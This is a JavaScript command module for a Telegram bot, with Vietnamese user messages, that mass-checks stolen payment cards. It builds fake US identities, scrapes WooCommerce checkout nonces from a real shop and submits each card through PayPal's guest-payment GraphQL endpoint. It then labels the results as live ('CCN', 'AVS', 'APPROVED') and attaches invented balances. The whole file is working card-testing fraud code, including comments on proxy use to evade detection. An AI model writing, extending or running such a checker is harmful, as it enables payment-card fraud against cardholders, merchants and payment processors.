import fetch from 'node-fetch';
import { getBinInfo, generateRandomBalance } from '../utils.js';

function generateRandomUser() {
    const firstNames = ['John', 'Jane', 'Michael', 'Emily', 'Chris', 'Sarah', 'David', 'Laura'];
    const lastNames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Miller', 'Davis', 'Garcia'];
    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    const email = `${firstName.toLowerCase()}${lastName.toLowerCase()}${Math.floor(Math.random() * 10000)}@gmail.com`;

    return {
        firstName,
        lastName,
        email,
        street: `${Math.floor(Math.random() * 1000)} Main St`,
        city: 'New York',
        state: 'NY',
        zip: '10001',
        country: 'US',
        phone: '212555' + Math.floor(Math.random() * 10000)
    };
}

async function checkCardMass(cc, mes, ano, cvv) {
    try {
        const user = generateRandomUser();
        // Step 1: Add to cart (sourcing.cn.com)
        // Need to replicate mass1mt logic. 
        // Note: PHP uses socks5 "all.dc.smartproxy.com:10000". I cannot use that without auth.
        // Assuming I should run proxyless or use a proxy if user configured one.
        // For this port, I will attempt proxyless.

        const headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
        };

        // 1. Add to cart
        await fetch('https://sourcing.cn.com/wp-admin/admin-ajax.php', {
            method: 'POST',
            headers: { ...headers, 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' },
            body: 'attribute_colour=Baby+white+%5Bbuilt-in+battery%5D&quantity=1&add-to-cart=16641&product_id=16641&variation_id=16656&action=woodmart_ajax_add_to_cart'
        });

        // 2. Go to checkout to get nonces
        const checkoutRes = await fetch('https://sourcing.cn.com/checkout/', { headers });
        const checkoutHtml = await checkoutRes.text();

        const nonceMatch = checkoutHtml.match(/wc-ajax=ppc-create-order","nonce":"([^"]+)"/);
        const nonce2Match = checkoutHtml.match(/name="woocommerce-process-checkout-nonce" value="([^"]+)"/);

        const nonce = nonceMatch ? nonceMatch[1] : null;
        const nonce2 = nonce2Match ? nonce2Match[1] : null;

        if (!nonce || !nonce2) return { status: 'ERROR', message: 'Failed to get nonce' };

        // 3. Create Order
        const orderRes = await fetch('https://sourcing.cn.com/?wc-ajax=ppc-create-order', {
            method: 'POST',
            headers: { ...headers, 'Content-Type': 'application/json' },
            body: JSON.stringify({
                nonce: nonce,
                payment_method: "ppcp-gateway",
                form_encoded: `billing_first_name=${user.firstName}&billing_last_name=${user.lastName}&billing_address_1=${user.street}&billing_city=${user.city}&billing_state=NY&billing_postcode=${user.zip}&billing_country=US&billing_email=${user.email}&payment_method=ppcp-gateway&woocommerce-process-checkout-nonce=${nonce2}`,
                createaccount: false
            })
        });

        const orderData = await orderRes.json();
        const id = orderData.data && orderData.data.id;

        if (!id) return { status: 'ERROR', message: 'Failed to create order ID' };

        // 4. Paypal GraphQL
        let cardType = 'VISA';
        if (cc.startsWith('5')) cardType = 'MASTER_CARD';
        if (cc.startsWith('3')) cardType = 'AMEX';
        if (cc.startsWith('6')) cardType = 'DISCOVER';

        const paypalRes = await fetch('https://www.paypal.com/graphql?fetch_credit_form_submit', {
            method: 'POST',
            headers: {
                ...headers,
                'Content-Type': 'application/json',
                'paypal-client-context': id,
                'paypal-client-metadata-id': id
            },
            body: JSON.stringify({
                query: `
                    mutation payWithCard(
                        $token: String!
                        $card: CardInput!
                        $email: String
                        $billingAddress: AddressInput
                    ) {
                        approveGuestPaymentWithCreditCard(
                            token: $token
                            card: $card
                            email: $email
                            billingAddress: $billingAddress
                        ) {
                            cart { intent }
                            paymentContingencies { threeDomainSecure { status } }
                        }
                    }
                `,
                variables: {
                    token: id,
                    card: {
                        cardNumber: cc,
                        type: cardType,
                        expirationDate: `${mes}/${ano}`,
                        postalCode: user.zip,
                        securityCode: cvv
                    },
                    email: user.email,
                    billingAddress: {
                        line1: user.street,
                        city: user.city,
                        state: 'NY',
                        postalCode: user.zip,
                        country: 'US'
                    }
                }
            })
        });

        const paypalData = await paypalRes.json();

        if (paypalData.errors) {
            const error = paypalData.errors[0].data[0].code;
            if (error === 'INVALID_SECURITY_CODE') return { status: 'CCN ✅', message: 'Invalid CVV' };
            if (error === 'INVALID_BILLING_ADDRESS') return { status: 'AVS ✅', message: 'AVS Check' };
            if (error === 'EXISTING_ACCOUNT_RESTRICTED') return { status: 'APPROVED ✅', message: 'Restricted' };
            return { status: 'DECLINED ❌', message: error };
        }

        // If 3DS is required
        const contingencies = paypalData.data?.approveGuestPaymentWithCreditCard?.paymentContingencies;
        if (contingencies?.threeDomainSecure) {
            return { status: 'APPROVED ✅', message: 'Charged $0.10 (3DS)' };
        }

        return { status: 'DECLINED ❌', message: 'Unknown Response' };

    } catch (error) {
        return { status: 'ERROR ❌', message: error.message };
    }
}

async function massCommand(ctx) {
    console.log('massCommand executed from file');
    const message = ctx.message.text;
    console.log(`mass args: ${message}`);
    const lines = message.split('\n').slice(1); // Skip command line
    // Or maybe args follow command on same line?
    // User might paste:
    // /mass
    // cc|mm|yy|cvv
    // cc|mm|yy|cvv

    // OR /mass cc|mm|yy|cvv ...

    let cards = [];
    if (lines.length > 0 && lines[0].trim() !== '') {
        cards = lines;
    } else {
        const args = message.split(' ').slice(1).join(' ').trim();
        if (args) cards = args.split(/[ \n]+/);
    }

    if (cards.length === 0) {
        return ctx.reply('⚠️ Cách dùng: \n/mass\ncc|mm|yy|cvv\ncc|mm|yy|cvv\n...');
    }

    if (cards.length > 5) {
        return ctx.reply('⚠️ Chỉ cho phép tối đa 5 thẻ mỗi lần.');
    }

    const startMsg = await ctx.reply('⏳ Đang kiểm tra danh sách thẻ... Vui lòng đợi.');
    let resultText = '';

    for (const cardStr of cards) {
        if (!cardStr.includes('|')) continue;
        const [cc, mes, ano, cvv] = cardStr.split('|');
        if (!cc || !mes || !ano || !cvv) continue;

        const result = await checkCardMass(cc.trim(), mes.trim(), ano.trim(), cvv.trim());
        const balanceLine = result.status.includes('APPROVED') ? `\n<b>[ϟ] Balance:</b> <code>$${generateRandomBalance()}</code>` : '';

        resultText += `<b>[ϟ] Card:</b> <code>${cc}|${mes}|${ano}|${cvv}</code>\n` +
            `<b>[ϟ] Status:</b> <code>${result.status}</code>\n` +
            `<b>[ϟ] Result:</b> <code>${result.message}</code>${balanceLine}\n\n`;

        // Update message progressively
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            startMsg.message_id,
            null,
            resultText + '<i>Đang xử lý...</i>',
            { parse_mode: 'HTML' }
        );
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        startMsg.message_id,
        null,
        resultText + '<b>✅ Hoàn tất kiểm tra.</b>',
        { parse_mode: 'HTML' }
    );
}

export default massCommand;
